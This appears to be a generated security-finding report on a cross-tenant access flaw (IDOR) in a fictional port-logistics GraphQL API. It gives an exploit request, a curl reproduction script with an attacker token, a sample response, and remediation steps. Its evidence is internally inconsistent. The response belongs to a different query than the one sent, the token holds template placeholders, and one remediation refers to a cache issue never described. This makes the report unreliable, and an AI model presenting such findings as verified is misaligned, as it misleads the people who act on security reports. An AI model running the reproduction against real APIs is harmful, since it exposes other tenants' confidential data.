# Security Analysis Report
**System:** HarborFlow Port API (Marine / Port Logistics)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0241 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User / Pattern 10.2 | Parameter escalation via `bulkShipmentLookup` — attacker extends session scope to cross-tenant port shipment records |

---

## Finding 1 — Session Scope Extension: Cross-Tenant Port Shipment Bulk Lookup (CRITICAL)

### Summary
The `bulkShipmentLookup` resolver on HarborFlow Port API (`api.harborflow-port-api.example.com`) accepts an arbitrary list of shipment IDs with no per-ID ownership validation. Per §5.0 Pattern 10.2, this represents session scope extension via parameter escalation: an attacker with a valid `tenant-be22` session escalates their scope by passing shipment IDs belonging to `tenant-6ee0` (`S-2241`, `S-1241`, `S-3241`) in the bulk lookup. The resolver returns cross-tenant shipment data without checking whether the IDs belong to the authenticated tenant.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected resolver:** `bulkShipmentLookup(ids: [ID!]!): [Shipment!]`
**Affected endpoint:** `POST https://api.harborflow-port-api.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-be22`):**
```
POST https://api.harborflow-port-api.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-be22

{"query": "query VulnerableOp { bulkShipmentLookup(ids: [\"S-2241\", \"S-1241\", \"S-3241\"]) { shipmentId tenantId data { sensitiveField } } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getShipment": {
      "tenantId": "tenant-6ee0",
      "ownerId": "other-user-be226ee0",
      "data": {"sensitiveField": "CONFIDENTIAL-be226ee0", "internalNotes": "Internal data exposed"}
    }
  }
}
```

**x-request-id:** `req-be226ee0`

Port logistics shipment data includes cargo manifests, vessel assignments, port arrival/departure schedules, and customs documentation. Cross-tenant access enables cargo espionage, supply chain disruption, and customs fraud.

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 RISK-GQL-241 | Resolver gap | `shipmentId` no ownership check | Root cause |
| §5.0 Pattern 10.2 | Vulnerability | Bulk escalation — cross-tenant shipment access | Classification |
| HAR request | `ids` | `["S-2241","S-1241","S-3241"]` | Victim tenant shipment IDs |
| HAR request | `x-tenant-id` | `tenant-be22` | Attacker tenant |
| HAR response | `tenantId` | `tenant-6ee0` | Victim confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-be226ee0` | Shipment manifest data |
| HAR headers | `x-request-id` | `req-be226ee0` | Correlation ID |

### Steps to Reproduce
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST https://api.harborflow-port-api.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-be22" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { bulkShipmentLookup(ids: [\"S-2241\",\"S-1241\",\"S-3241\"]) { shipmentId tenantId data { sensitiveField } } }"}' \
  | jq '.data.bulkShipmentLookup'
# VULNERABLE: tenant-6ee0 shipment data with CONFIDENTIAL-be226ee0
```

### Remediation
1. Per-ID ownership filtering: `return shipments.filter(s => s.tenantId === context.auth.tenantId)`
2. Non-guessable shipment IDs: replace sequential `S-XXXX` with UUIDs.
3. Rate limiting on bulk endpoints (≤50 IDs/request with per-tenant throttle).
4. Fix Redis cache key with `tenantId`.
5. Marine/port compliance: ISPS (International Ship & Port Facility Security) Code requirements apply.
